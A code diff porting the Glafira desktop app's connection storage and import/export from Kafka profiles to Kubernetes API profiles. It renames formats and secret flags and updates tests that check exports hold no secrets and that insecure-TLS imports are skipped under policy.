@@ -180,10 +174,7 @@ mod tests {
         let dir = tempfile::tempdir().unwrap();
         let secrets = Arc::new(MemoryStore::default());
         secrets
-            .set(
-                &secret_key("a", crate::kafka::config::SASL_PASSWORD),
-                "s3cr3t",
-            )
+            .set(&secret_key("a", crate::secrets::TOKEN), "s3cr3t")
             .unwrap();
         let st = AppState::new(dir.path(), secrets).unwrap();
         let f = st.connections.create_folder("ИФТ", None).unwrap();
@@ -192,7 +183,7 @@ mod tests {
         st.connections.upsert(p).unwrap();
         st.connections.upsert(sample_profile("b")).unwrap();
 
-        let path = dir.path().join("out.glafira-connections.json");
+        let path = dir.path().join("out.glafira-kubernetes-connections.json");
         let sum = export_to_file(&st, &path, Some(&f.id), "2026-10-17T12:00:00Z").unwrap();
         assert_eq!(
             sum,
@@ -204,7 +195,7 @@ mod tests {
         let text = std::fs::read_to_string(&path).unwrap();
         assert!(!text.contains("s3cr3t"));
         let v: serde_json::Value = serde_json::from_str(&text).unwrap();
-        assert_eq!(v["format"], "glafira-connections");
+        assert_eq!(v["format"], "glafira-kubernetes-connections");
         assert_eq!(v["appVersion"], env!("CARGO_PKG_VERSION"));
         assert_eq!(v["connections"][0]["id"], "a");
 
@@ -212,16 +203,16 @@ mod tests {
         assert_eq!(err.key, "errors.folders.notFound");
     }
 
-    fn write_file(dir: &Path, profile_bootstrap: &str) -> std::path::PathBuf {
+    fn write_file(dir: &Path, api_url: &str) -> std::path::PathBuf {
         let mut p = serde_json::to_value(sample_profile("a")).unwrap();
-        p["bootstrapServers"] = profile_bootstrap.into();
+        p["apiUrl"] = api_url.into();
         let mut n = serde_json::to_value(sample_profile("n")).unwrap();
         n["environment"] = "prod".into();
-        let path = dir.join("in.glafira-connections.json");
+        let path = dir.join("in.glafira-kubernetes-connections.json");
         std::fs::write(
             &path,
             serde_json::to_vec(&serde_json::json!({
-                "format": "glafira-connections", "version": 1,
+                "format": "glafira-kubernetes-connections", "version": 1,
                 "folders": [], "connections": [p, n],
             }))
             .unwrap(),
@@ -236,7 +227,7 @@ mod tests {
         let st = AppState::new(dir.path(), Arc::new(MemoryStore::default())).unwrap();
         st.connections.upsert(sample_profile("a")).unwrap();
         let input = tempfile::tempdir().unwrap();
-        let path = write_file(input.path(), "changed:9092");
+        let path = write_file(input.path(), "https://api.changed:6443");
         let conns = dir.path().join("connections.json");
         let before = std::fs::read(&conns).unwrap();
 
@@ -250,8 +241,8 @@ mod tests {
         let applied = import_from_file(&st, &path, None, true, true).unwrap();
         assert_eq!(applied, preview);
         assert_eq!(
-            st.connections.get("a").unwrap().bootstrap_servers,
-            "changed:9092"
+            st.connections.get("a").unwrap().api_url,
+            "https://api.changed:6443"
         );
         assert!(!st.connections.get("n").unwrap().read_only);
         let reopened = crate::storage::connections::ConnectionStore::open(dir.path()).unwrap();
@@ -266,7 +257,7 @@ mod tests {
         let data = dir.path().join("data");
         let st = AppState::new(&data, Arc::new(MemoryStore::default())).unwrap();
         st.connections.upsert(sample_profile("a")).unwrap();
-        let path = write_file(dir.path(), "changed:9092");
+        let path = write_file(dir.path(), "https://api.changed:6443");
         let conns = data.join("connections.json");
         let before = std::fs::read(&conns).unwrap();
 
@@ -278,9 +269,38 @@ mod tests {
         assert_eq!(std::fs::read(&conns).unwrap(), before);
         assert_eq!(st.connections.list().len(), 1);
         assert_eq!(
-            st.connections.get("a").unwrap().bootstrap_servers,
-            "localhost:9092"
+            st.connections.get("a").unwrap().api_url,
+            "https://api.dev.example.com:6443"
+        );
+    }
+
+    #[test]
+    fn policy_forbidding_insecure_tls_skips_such_connections() {
+        let dir = tempfile::tempdir().unwrap();
+        let mut policy = crate::policy::Policy::default();
+        policy.status.allow_insecure_tls = false;
+        let st = AppState::new(dir.path(), Arc::new(MemoryStore::default()))
+            .unwrap()
+            .with_policy(policy);
+        let mut insecure = serde_json::to_value(sample_profile("i")).unwrap();
+        insecure["ca"] = serde_json::json!({"mode": "insecure"});
+        let path = dir.path().join("in.glafira-kubernetes-connections.json");
+        std::fs::write(
+            &path,
+            serde_json::to_vec(&serde_json::json!({
+                "format": "glafira-kubernetes-connections", "version": 1,
+                "folders": [], "connections": [insecure],
+            }))
+            .unwrap(),
+        )
+        .unwrap();
+        let applied = import_from_file(&st, &path, None, true, true).unwrap();
+        assert!(applied.added.is_empty());
+        assert_eq!(
+            applied.skipped[0].reason.key,
+            "errors.import.insecureForbidden"
         );
+        assert!(st.connections.list().is_empty());
     }
 
     #[test]
````

<!-- block: patch t04-port-src-tauri-src-storage-connections-rs step=4.1 -->
````diff
diff --git a/src-tauri/src/storage/connections.rs b/src-tauri/src/storage/connections.rs
--- a/src-tauri/src/storage/connections.rs
+++ b/src-tauri/src/storage/connections.rs
@@ -1,4 +1,3 @@
-use std::collections::BTreeMap;
 use std::path::{Path, PathBuf};
 use std::sync::RwLock;
 
@@ -6,149 +5,11 @@ use serde::{Deserialize, Serialize};
 
 use crate::error::{AppError, AppResult, ErrorCode};
 use crate::storage::fs::{read_json, write_json};
+#[cfg(test)]
+pub use crate::storage::profile::sample_profile;
+pub use crate::storage::profile::{ConnectionProfile, Environment, validate_profile};
 use crate::sync::RwLockExt;
 
-#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
-#[serde(rename_all = "lowercase")]
-pub enum Environment {
-    Local,
-    Dev,
-    Test,
-    Stage,
-    Prod,
-}
-
-#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
-pub enum SaslMechanism {
-    #[serde(rename = "PLAIN")]
-    Plain,
-    #[serde(rename = "SCRAM-SHA-256")]
-    ScramSha256,
-    #[serde(rename = "SCRAM-SHA-512")]
-    ScramSha512,
-}
-
-impl SaslMechanism {
-    pub fn as_str(self) -> &'static str {
-        match self {
-            SaslMechanism::Plain => "PLAIN",
-            SaslMechanism::ScramSha256 => "SCRAM-SHA-256",
-            SaslMechanism::ScramSha512 => "SCRAM-SHA-512",
-        }
-    }
-}
-
-fn default_true() -> bool {
-    true
-}
-
-fn default_request_timeout() -> u64 {
-    30_000
-}
-
-#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, Serialize, Deserialize)]
-#[serde(rename_all = "lowercase")]
-pub enum CertFormat {
-    #[default]
-    Pem,
-    Pkcs12,
-    Jks,
-}
-
-#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
-#[serde(rename_all = "camelCase")]
-pub struct ClientCert {
-    pub format: CertFormat,
-    pub certificate_path: String,
-    #[serde(default)]
-    pub key_path: Option<String>,
-    #[serde(default)]
-    pub alias: Option<String>,
-}
-
-#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
-#[serde(rename_all = "camelCase")]
-pub struct TlsConfig {
-    #[serde(default)]
-    pub ca_location: Option<String>,
-    #[serde(default)]
-    pub ca_format: CertFormat,
-    #[serde(default = "default_true")]
-    pub verify_hostname: bool,
-    #[serde(default)]
-    pub client_cert: Option<ClientCert>,
-}
-
-#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
-#[serde(rename_all = "camelCase")]
-pub struct SaslConfig {
-    pub mechanism: SaslMechanism,
-    pub username: String,
-}
-
-#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
-#[serde(tag = "protocol", rename_all = "SCREAMING_SNAKE_CASE")]
-pub enum SecurityConfig {
-    Plaintext,
-    Ssl { tls: TlsConfig },
-    SaslPlaintext { sasl: SaslConfig },
-    SaslSsl { tls: TlsConfig, sasl: SaslConfig },
-}
-
-impl SecurityConfig {
-    pub fn uses_sasl(&self) -> bool {
-        matches!(
-            self,
-            SecurityConfig::SaslPlaintext { .. } | SecurityConfig::SaslSsl { .. }
-        )
-    }
-}
-
-/// Доступ LLM к подключению через MCP (спец. G1 §4). Неизвестное значение из более новой
-/// версии читается как `Off`: старая версия доступ только сужает.
-#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, Serialize, Deserialize)]
-#[serde(rename_all = "lowercase")]
-pub enum LlmAccess {
-    Metadata,
-    #[default]
-    #[serde(other)]
-    Off,
-}
-
-impl LlmAccess {
-    pub fn is_off(&self) -> bool {
-        *self == LlmAccess::Off
-    }
-}
-
-#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
-#[serde(rename_all = "camelCase")]
-pub struct ConnectionProfile {
-    pub id: String,
-    pub name: String,
-    pub color: String,
-    pub environment: Environment,
-    pub read_only: bool,
-    pub bootstrap_servers: String,
-    pub security: SecurityConfig,
-    #[serde(default)]
-    pub extra_properties: BTreeMap<String, String>,
-    #[serde(default = "default_request_timeout")]
-    pub request_timeout_ms: u64,
-    #[serde(default)]
-    pub folder_id: Option<String>,
-    #[serde(default)]
-    pub order: i64,
-    /// Локальное поле, как папка и порядок: экспорт его не пишет, импорт не переносит.
-    #[serde(default, skip_serializing_if = "LlmAccess::is_off")]
-    pub llm_access: LlmAccess,
-    /// Поля из более новой версии Glafira: сохраняются при записи как есть.
-    /// `ConnectionStore::upsert` входящий `extra` не принимает: у существующего профиля
-    /// остаётся сохранённый, новый получает пустой.
-    #[serde(flatten)]
-    pub extra: serde_json::Map<String, serde_json::Value>,
-}
-
 #[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
 #[serde(rename_all = "camelCase")]
 pub struct ConnectionFolder {
@@ -163,187 +24,6 @@ pub struct ConnectionFolder {
     pub extra: serde_json::Map<String, serde_json::Value>,
 }
 
-pub fn parse_bootstrap(s: &str) -> AppResult<Vec<(String, u16)>> {
-    let mut out = Vec::new();
-    for raw in s.split(',').map(str::trim).filter(|x| !x.is_empty()) {
-        let (host, port) = raw.rsplit_once(':').ok_or_else(|| {
-            app_err!(
-                ErrorCode::InvalidInput,
-                "errors.connections.addressFormat",
-                "Address “{{address}}” must be in host:port format",
-                address = raw
-            )
-        })?;
-        let port: u16 = port.parse().map_err(|_| {
-            app_err!(
-                ErrorCode::InvalidInput,
-                "errors.connections.badPort",
-                "Invalid port in address “{{address}}”",
-                address = raw
-            )
-        })?;
-        let host = host.trim_start_matches('[').trim_end_matches(']');
-        if host.is_empty() {
-            return Err(app_err!(
-                ErrorCode::InvalidInput,
-                "errors.connections.emptyHost",
-                "Empty host in address “{{address}}”",
-                address = raw
-            ));
-        }
-        out.push((host.to_string(), port));
-    }
-    if out.is_empty() {
-        return Err(app_err!(
-            ErrorCode::InvalidInput,
-            "errors.connections.noBootstrap",
-            "Specify at least one bootstrap server"
-        ));
-    }
-    Ok(out)
-}
-
-pub(crate) fn is_secret_property(key: &str) -> bool {
-    let k = key.to_ascii_lowercase();
-    k.contains("password")
-        || k.contains("secret")
-        || k.contains("sasl.jaas.config")
-        || k == "ssl.key.pem"
-        || k == "ssl.keystore.key"
-}
-
-/// Файл TLS, путь к которому проверяется: у каждого свои тексты ошибок.
-#[derive(Clone, Copy)]
-enum TlsFile {
-    Ca,
-    Certificate,
-    Key,
-}
-
-fn path_required(what: TlsFile) -> AppError {
-    match what {
-        TlsFile::Ca => app_err!(
-            ErrorCode::InvalidInput,
-            "errors.connections.caRequired",
-            "Specify a file: trusted CA"
-        ),
-        TlsFile::Certificate => app_err!(
-            ErrorCode::InvalidInput,
-            "errors.connections.certificateRequired",
-            "Specify a file: client certificate"
-        ),
-        TlsFile::Key => app_err!(
-            ErrorCode::InvalidInput,
-            "errors.connections.keyRequired",
-            "Specify a file: client key"
-        ),
-    }
-}
-
-fn path_not_absolute(what: TlsFile, path: &str) -> AppError {
-    match what {
-        TlsFile::Ca => app_err!(
-            ErrorCode::InvalidInput,
-            "errors.connections.caNotAbsolute",
-            "Trusted CA: specify an absolute path (currently “{{path}}”)",
-            path = path
-        ),
-        TlsFile::Certificate => app_err!(
-            ErrorCode::InvalidInput,
-            "errors.connections.certificateNotAbsolute",
-            "Client certificate: specify an absolute path (currently “{{path}}”)",
-            path = path
-        ),
-        TlsFile::Key => app_err!(
-            ErrorCode::InvalidInput,
-            "errors.connections.keyNotAbsolute",
-            "Client key: specify an absolute path (currently “{{path}}”)",
-            path = path
-        ),
-    }
-}
-
-fn validate_path(path: &str, what: TlsFile) -> AppResult<()> {
-    if path.trim().is_empty() {
-        return Err(path_required(what));
-    }
-    if !std::path::Path::new(path.trim()).is_absolute() {
-        return Err(path_not_absolute(what, path));
-    }
-    Ok(())
-}
-
-fn validate_tls(tls: &TlsConfig) -> AppResult<()> {
-    if let Some(ca) = tls.ca_location.as_deref().filter(|s| !s.trim().is_empty()) {
-        validate_path(ca, TlsFile::Ca)?;
-    }
-    if let Some(cc) = &tls.client_cert {
-        validate_path(&cc.certificate_path, TlsFile::Certificate)?;
-        if cc.format == CertFormat::Pem {
-            match cc.key_path.as_deref() {
-                Some(k) if !k.trim().is_empty() => validate_path(k, TlsFile::Key)?,
-                _ => {
-                    return Err(app_err!(
-                        ErrorCode::InvalidInput,
-                        "errors.connections.pemKeyRequired",
-                        "Specify a file: client key (PEM)"
-                    ));
-                }
-            }
-        }
-    }
-    Ok(())
-}
-
-pub fn validate_profile(p: &ConnectionProfile) -> AppResult<()> {
-    if p.id.trim().is_empty() {
-        return Err(app_err!(
-            ErrorCode::InvalidInput,
-            "errors.connections.noId",
-            "The connection has no ID"
-        ));
-    }
-    if p.name.trim().is_empty() {
-        return Err(app_err!(
-            ErrorCode::InvalidInput,
-            "errors.connections.emptyName",
-            "Connection name cannot be empty"
-        ));
-    }
-    parse_bootstrap(&p.bootstrap_servers)?;
-    if let SecurityConfig::SaslPlaintext { sasl } | SecurityConfig::SaslSsl { sasl, .. } =
-        &p.security
-        && sasl.username.trim().is_empty()
-    {
-        return Err(app_err!(
-            ErrorCode::InvalidInput,
-            "errors.connections.saslUsernameRequired",
-            "Specify the SASL username"
-        ));
-    }
-    if let SecurityConfig::Ssl { tls } | SecurityConfig::SaslSsl { tls, .. } = &p.security {
-        validate_tls(tls)?;
-    }
-    // Секреты хранятся только в keychain: connections.json не должен их содержать.
-    // Неизвестные поля (`extra`) здесь не проверяются: `upsert` не принимает их из запроса.
-    if let Some(key) = p.extra_properties.keys().find(|k| is_secret_property(k)) {
-        return Err(app_err!(
-            ErrorCode::InvalidInput,
-            "errors.connections.secretInExtraProperties",
-            "Secrets cannot be stored in extra properties: {{key}}",
-            key = key
-        ));
-    }
-    if p.request_timeout_ms < 1_000 {
-        return Err(app_err!(
-            ErrorCode::InvalidInput,
-            "errors.connections.timeoutTooSmall",
-            "Request timeout must be at least 1000 ms"
-        ));
-    }
-    Ok(())
-}
-
 pub(crate) fn connection_not_found(id: &str) -> AppError {
     app_err!(
         ErrorCode::NotFound,
@@ -695,6 +375,7 @@ impl ConnectionStore {
     /// игнорируется всегда: неизвестные поля пишет только сама Glafira (существующий профиль
     /// сохраняет свои, новый получает пустые), поэтому через них нельзя записать секрет в файл.
     pub fn upsert(&self, mut profile: ConnectionProfile) -> AppResult<ConnectionProfile> {
+        crate::storage::profile::normalize_profile(&mut profile);
         validate_profile(&profile)?;
         self.update(|data| {
             match data.connections.iter_mut().find(|c| c.id == profile.id) {
@@ -743,187 +424,22 @@ impl ConnectionStore {
     }
 }
 
-#[cfg(test)]
-pub fn sample_profile(id: &str) -> ConnectionProfile {
-    ConnectionProfile {
-        id: id.to_string(),
-        name: format!("conn-{id}"),
-        color: "#4f8cff".into(),
-        environment: Environment::Dev,
-        read_only: false,
-        bootstrap_servers: "localhost:9092".into(),
-        security: SecurityConfig::Plaintext,
-        extra_properties: BTreeMap::new(),
-        request_timeout_ms: 30_000,
-        folder_id: None,
-        order: 0,
-        llm_access: LlmAccess::Off,
-        extra: Default::default(),
-    }
-}
-
 #[cfg(test)]
 mod tests {
     use super::*;
     use crate::error::ErrorCode;
 
-    #[test]
-    fn llm_access_defaults_to_off_and_is_written_only_when_open() {
-        let mut v = serde_json::to_value(sample_profile("a")).unwrap();
-        assert!(v.get("llmAccess").is_none(), "Off не пишется");
-        let p: ConnectionProfile = serde_json::from_value(v.clone()).unwrap();
-        assert_eq!(p.llm_access, LlmAccess::Off);
-        v["llmAccess"] = "metadata".into();
-        let p: ConnectionProfile = serde_json::from_value(v.clone()).unwrap();
-        assert_eq!(p.llm_access, LlmAccess::Metadata);
-        assert_eq!(serde_json::to_value(&p).unwrap()["llmAccess"], "metadata");
-        // Значение из более новой версии (G4) старая версия читает как Off.
-        v["llmAccess"] = "samples".into();
-        let p: ConnectionProfile = serde_json::from_value(v).unwrap();
-        assert_eq!(p.llm_access, LlmAccess::Off);
-    }
-
-    #[test]
-    fn old_tls_profiles_get_defaults() {
-        let tls: TlsConfig =
-            serde_json::from_str(r#"{"caLocation":"/ca.pem","verifyHostname":false}"#).unwrap();
-        assert_eq!(tls.ca_format, CertFormat::Pem);
-        assert_eq!(tls.client_cert, None);
-        assert!(!tls.verify_hostname);
-    }
-
-    #[test]
-    fn client_cert_json_shape() {
-        let tls = TlsConfig {
-            ca_location: None,
-            ca_format: CertFormat::Jks,
-            verify_hostname: true,
-            client_cert: Some(ClientCert {
-                format: CertFormat::Pkcs12,
-                certificate_path: "/c.p12".into(),
-                key_path: None,
-                alias: None,
-            }),
-        };
-        let v = serde_json::to_value(&tls).unwrap();
-        assert_eq!(v["caFormat"], "jks");
-        assert_eq!(v["clientCert"]["format"], "pkcs12");
-        assert_eq!(v["clientCert"]["certificatePath"], "/c.p12");
-    }
-
-    fn tls_profile(tls: TlsConfig) -> ConnectionProfile {
-        let mut p = sample_profile("a");
-        p.security = SecurityConfig::Ssl { tls };
-        p
-    }
-
-    #[test]
-    fn validation_of_certificate_paths() {
-        let base = TlsConfig {
-            ca_location: None,
-            ca_format: CertFormat::Pem,
-            verify_hostname: true,
-            client_cert: None,
-        };
-        let pem = |cert: &str, key: Option<&str>| TlsConfig {
-            client_cert: Some(ClientCert {
-                format: CertFormat::Pem,
-                certificate_path: cert.into(),
-                key_path: key.map(String::from),
-                alias: None,
-            }),
-            ..base.clone()
-        };
-        let abs = if cfg!(windows) {
-            "C:\\c\\c.pem"
-        } else {
-            "/c/c.pem"
-        };
-        assert!(validate_profile(&tls_profile(pem(abs, Some(abs)))).is_ok());
-        for (tls, key) in [
-            (pem("", Some(abs)), "errors.connections.certificateRequired"),
-            (
-                pem("rel/c.pem", Some(abs)),
-                "errors.connections.certificateNotAbsolute",
-            ),
-            (pem(abs, None), "errors.connections.pemKeyRequired"),
-            (pem(abs, Some("k.pem")), "errors.connections.keyNotAbsolute"),
-            (
-                TlsConfig {
-                    ca_location: Some("ca.pem".into()),
-                    ..base.clone()
-                },
-                "errors.connections.caNotAbsolute",
-            ),
-        ] {
-            let e = validate_profile(&tls_profile(tls)).unwrap_err();
-            assert_eq!(e.code, ErrorCode::InvalidInput);
-            assert_eq!(e.key, key, "{}", e.message);
-        }
-    }
-
-    #[test]
-    fn private_key_material_is_rejected_in_extra_properties() {
-        for key in ["ssl.key.pem", "SSL.KEYSTORE.KEY"] {
-            let mut p = sample_profile("a");
-            p.extra_properties.insert(key.into(), "x".into());
-            assert_eq!(
-                validate_profile(&p).unwrap_err().code,
-                ErrorCode::InvalidInput,
-                "{key}"
-            );
-        }
-    }
-
-    #[test]
-    fn parse_bootstrap_variants() {
-        assert_eq!(
-            parse_bootstrap(" a:9092, b:9093 ,").unwrap(),
-            vec![("a".to_string(), 9092), ("b".to_string(), 9093)]
-        );
-        assert_eq!(
-            parse_bootstrap("[::1]:9092").unwrap(),
-            vec![("::1".to_string(), 9092)]
-        );
-        assert_eq!(
-            parse_bootstrap("host").unwrap_err().code,
-            ErrorCode::InvalidInput
-        );
-        assert_eq!(
-            parse_bootstrap("host:abc").unwrap_err().code,
-            ErrorCode::InvalidInput
-        );
-        assert_eq!(
-            parse_bootstrap(" , ").unwrap_err().code,
-            ErrorCode::InvalidInput
-        );
-    }
-
     #[test]
     fn persists_and_reloads() {
         let dir = tempfile::tempdir().unwrap();
         let store = ConnectionStore::open(dir.path()).unwrap();
         store.upsert(sample_profile("a")).unwrap();
         let mut b = sample_profile("b");
-        b.security = SecurityConfig::SaslSsl {
-            tls: TlsConfig {
-                ca_location: Some(
-                    if cfg!(windows) {
-                        "C:\\ca.pem"
-                    } else {
-                        "/ca.pem"
-                    }
-                    .into(),
-                ),
-                ca_format: CertFormat::Pem,
-                verify_hostname: false,
-                client_cert: None,
-            },
-            sasl: SaslConfig {
-                mechanism: SaslMechanism::ScramSha512,
-                username: "alice".into(),
-            },
+        b.auth = crate::storage::profile::AuthConfig::ClientCert {
+            certificate_pem: crate::storage::profile::TEST_CERT_PEM.into(),
         };
+        b.ca = crate::storage::profile::CaConfig::Insecure;
+        b.favorite_namespaces = vec!["team-a".into()];
         let b = store.upsert(b).unwrap();
 
         let reopened = ConnectionStore::open(dir.path()).unwrap();
@@ -947,64 +463,14 @@ mod tests {
     }
 
     #[test]
-    fn validation_rejects_secrets_in_extra_properties() {
-        for key in [
-            "sasl.password",
-            "SSL.Key.Password",
-            "my.secret",
-            "SASL.JAAS.CONFIG",
-        ] {
-            let mut p = sample_profile("a");
-            p.extra_properties.insert(key.into(), "x".into());
-            let e = validate_profile(&p).unwrap_err();
-            assert_eq!(e.code, ErrorCode::InvalidInput, "{key}");
-            assert_eq!(e.key, "errors.connections.secretInExtraProperties");
-            assert_eq!(e.params["key"], key);
-        }
-        let mut p = sample_profile("a");
-        p.extra_properties
-            .insert("fetch.max.bytes".into(), "1".into());
-        assert!(validate_profile(&p).is_ok());
-    }
-
-    #[test]
-    fn validation_rejects_bad_profiles() {
-        let dir = tempfile::tempdir().unwrap();
-        let store = ConnectionStore::open(dir.path()).unwrap();
-        let mut p = sample_profile("a");
-        p.name = "  ".into();
-        assert_eq!(store.upsert(p).unwrap_err().code, ErrorCode::InvalidInput);
-        let mut p = sample_profile("a");
-        p.bootstrap_servers = "nope".into();
-        assert_eq!(store.upsert(p).unwrap_err().code, ErrorCode::InvalidInput);
-        assert!(store.list().is_empty());
-    }
-
-    #[test]
-    fn json_shape_matches_frontend_contract() {
-        let mut p = sample_profile("x");
-        p.security = SecurityConfig::SaslPlaintext {
-            sasl: SaslConfig {
-                mechanism: SaslMechanism::ScramSha256,
-                username: "u".into(),
-            },
-        };
-        let v = serde_json::to_value(&p).unwrap();
-        assert_eq!(v["bootstrapServers"], "localhost:9092");
-        assert_eq!(v["environment"], "dev");
-        assert_eq!(v["security"]["protocol"], "SASL_PLAINTEXT");
-        assert_eq!(v["security"]["sasl"]["mechanism"], "SCRAM-SHA-256");
-        assert_eq!(v["requestTimeoutMs"], 30000);
-    }
-
-    #[test]
-    fn file_contains_schema_version_and_no_password_field() {
+    fn file_contains_schema_version_and_no_secrets() {
         let dir = tempfile::tempdir().unwrap();
         let store = ConnectionStore::open(dir.path()).unwrap();
         store.upsert(sample_profile("a")).unwrap();
         let raw = std::fs::read_to_string(dir.path().join("connections.json")).unwrap();
         assert!(raw.contains("\"schemaVersion\": 1"));
         assert!(!raw.to_lowercase().contains("password"));
+        assert!(!raw.contains("\"token\":"));
     }
 
     #[test]
@@ -1013,8 +479,8 @@ mod tests {
         std::fs::write(
             dir.path().join("connections.json"),
             r##"{"schemaVersion":1,"connections":[
-          {"id":"a","name":"A","color":"#fff","environment":"dev","readOnly":false,"bootstrapServers":"h:1","security":{"protocol":"PLAINTEXT"}},
-          {"id":"b","name":"B","color":"#fff","environment":"dev","readOnly":false,"bootstrapServers":"h:1","security":{"protocol":"PLAINTEXT"}}]}"##,
+          {"id":"a","name":"A","color":"#fff","environment":"dev","readOnly":false,"apiUrl":"https://api.c:6443","auth":{"method":"token"}},
+          {"id":"b","name":"B","color":"#fff","environment":"dev","readOnly":false,"apiUrl":"https://api.c:6443","auth":{"method":"token"}}]}"##,
         )
         .unwrap();
         let store = ConnectionStore::open(dir.path()).unwrap();
@@ -1034,8 +500,8 @@ mod tests {
         std::fs::write(
             dir.path().join("connections.json"),
             r##"{"schemaVersion":1,"future":{"x":1},"folders":[{"id":"f","name":"F","parentId":null,"order":0,"icon":"star"}],
-           "connections":[{"id":"a","name":"A","color":"#fff","environment":"dev","readOnly":false,"bootstrapServers":"h:1",
-           "security":{"protocol":"PLAINTEXT"},"folderId":"f","order":0,"pinned":true}]}"##,
+           "connections":[{"id":"a","name":"A","color":"#fff","environment":"dev","readOnly":false,"apiUrl":"https://api.c:6443",
+           "auth":{"method":"token"},"folderId":"f","order":0,"pinned":true}]}"##,
         )
         .unwrap();
         let store = ConnectionStore::open(dir.path()).unwrap();
@@ -1059,13 +525,13 @@ mod tests {
         let dir = tempfile::tempdir().unwrap();
         let path = dir.path().join("connections.json");
         let qa = serde_json::json!({"id":"q","name":"QA","color":"#fff","environment":"qa","readOnly":false,
-            "bootstrapServers":"h:1","security":{"protocol":"PLAINTEXT"},"folderId":null,"order":0,"pinned":true});
+            "apiUrl":"https://api.c:6443","auth":{"method":"token"},"folderId":null,"order":0,"pinned":true});
         let raw_folder =
             serde_json::json!({"id":"rf","name":{"smart":"x"},"parentId":null,"order":1});
         let file = serde_json::json!({"schemaVersion":1,
             "folders":[raw_folder, {"id":"f","name":"F","parentId":"rf","order":0}],
             "connections":[qa, {"id":"a","name":"A","color":"#fff","environment":"dev","readOnly":false,
-                "bootstrapServers":"h:1","security":{"protocol":"PLAINTEXT"},"folderId":"rf","order":1}]});
+                "apiUrl":"https://api.c:6443","auth":{"method":"token"},"folderId":"rf","order":1}]});
         std::fs::write(&path, serde_json::to_vec(&file).unwrap()).unwrap();
 
         let store = ConnectionStore::open(dir.path()).unwrap();
@@ -1173,7 +639,7 @@ mod tests {
               {"id":"f","name":"F","parentId":"gone"},
               {"id":"x","name":"X","parentId":"y"},{"id":"y","name":"Y","parentId":"x"}],
               "connections":[{"id":"a","name":"A","color":"#fff","environment":"dev","readOnly":false,
-              "bootstrapServers":"h:1","security":{"protocol":"PLAINTEXT"},"folderId":"gone"}]}"##,
+              "apiUrl":"https://api.c:6443","auth":{"method":"token"},"folderId":"gone"}]}"##,
         )
         .unwrap();
         let store = ConnectionStore::open(dir.path()).unwrap();
@@ -1271,29 +737,18 @@ mod tests {
         check_tree(&store.cache.read_safe()).unwrap();
     }
 
-    #[test]
-    fn unknown_fields_are_not_validated() {
-        // Поля из более новой версии с «password»/«secret» в имени не мешают сохранению.
-        let mut p = sample_profile("a");
-        for key in ["passwordRotationDays", "secretRef", "usesSecretManager"] {
-            p.extra.insert(key.into(), serde_json::json!(1));
-        }
-        assert!(validate_profile(&p).is_ok());
-    }
-
     #[test]
     fn incoming_extra_is_ignored_on_save() {
         let dir = tempfile::tempdir().unwrap();
         let store = ConnectionStore::open(dir.path()).unwrap();
         // Новый профиль: неизвестные поля из запроса не пишутся.
         let mut p = sample_profile("a");
-        p.extra
-            .insert("saslPassword".into(), serde_json::json!("x"));
+        p.extra.insert("token".into(), serde_json::json!("x"));
         p.extra.insert("pinned".into(), serde_json::json!(true));
         assert!(store.upsert(p).unwrap().extra.is_empty());
         assert!(store.get("a").unwrap().extra.is_empty());
         let raw = std::fs::read_to_string(dir.path().join("connections.json")).unwrap();
-        assert!(!raw.contains("saslPassword") && !raw.contains("pinned"));
+        assert!(!raw.contains("\"token\":") && !raw.contains("pinned"));
         // Существующий профиль всегда сохраняет свои неизвестные поля.
         store
             .update(|d| {
````

<!-- block: patch t04-port-src-tauri-src-storage-exchange-rs step=4.1 -->
````diff
diff --git a/src-tauri/src/storage/exchange.rs b/src-tauri/src/storage/exchange.rs
--- a/src-tauri/src/storage/exchange.rs
+++ b/src-tauri/src/storage/exchange.rs
@@ -1,4 +1,4 @@
-//! Файл обмена подключениями (`glafira-connections`): экспорт без секретов, предпросмотр и
+//! Файл обмена подключениями (`glafira-kubernetes-connections`): экспорт без секретов, предпросмотр и
 //! применение импорта.
 
 use std::collections::{HashMap, HashSet};
@@ -7,27 +7,23 @@ use serde::{Deserialize, Serialize};
 
 use crate::error::{AppResult, ErrorCode};
 use crate::i18n::LocalizedText;
-use crate::kafka::config::{
-    SASL_PASSWORD, SSL_KEY_PASSWORD, SSL_KEYSTORE_PASSWORD, SSL_TRUSTSTORE_PASSWORD, uses_secret,
-};
-use crate::secrets::{SecretStore, secret_key};
+use crate::secrets::{CLIENT_KEY, SecretStore, TOKEN, secret_key};
 use crate::storage::connections::{
-    ConnectionFolder, ConnectionProfile, ConnectionStore, LlmAccess, SecurityConfig, StoreData,
-    check_tree, folder_not_found, is_secret_property, unique_name, validate_profile,
+    ConnectionFolder, ConnectionProfile, ConnectionStore, StoreData, check_tree, folder_not_found,
+    unique_name, validate_profile,
 };
+use crate::storage::profile::{AuthConfig, CaConfig};
 use crate::storage::tree::TreeItemKind;
 
-pub const EXCHANGE_FORMAT: &str = "glafira-connections";
+pub const EXCHANGE_FORMAT: &str = "glafira-kubernetes-connections";
 pub const EXCHANGE_VERSION: u32 = 1;
 
-/// Какие пароли были сохранены у подключения при экспорте.
+/// Какие секреты были сохранены у подключения при экспорте: получатель вводит свои.
 #[derive(Serialize, Deserialize, Clone, Debug, Default, PartialEq)]
 #[serde(rename_all = "camelCase")]
-pub struct NeedsPassword {
-    pub sasl: bool,
-    pub truststore: bool,
-    pub keystore: bool,
-    pub key: bool,
+pub struct NeedsSecret {
+    pub token: bool,
+    pub client_key: bool,
 }
 
 #[derive(Serialize)]
@@ -47,7 +43,7 @@ pub struct ExportedConnection {
     #[serde(flatten)]
     pub profile: ConnectionProfile,
     #[serde(default)]
-    pub needs_password: NeedsPassword,
+    pub needs_secret: NeedsSecret,
 }
 
 /// Итог экспорта для фронтенда.
@@ -58,29 +54,22 @@ pub struct ExportSummary {
     pub folders: usize,
 }
 
-/// Флаг поднимается, только если пароль сохранён и профиль его действительно использует
-/// (матрица `uses_secret`, та же, что при подключении и сохранении): устаревшие записи keychain
-/// не требуют ввода у получателя.
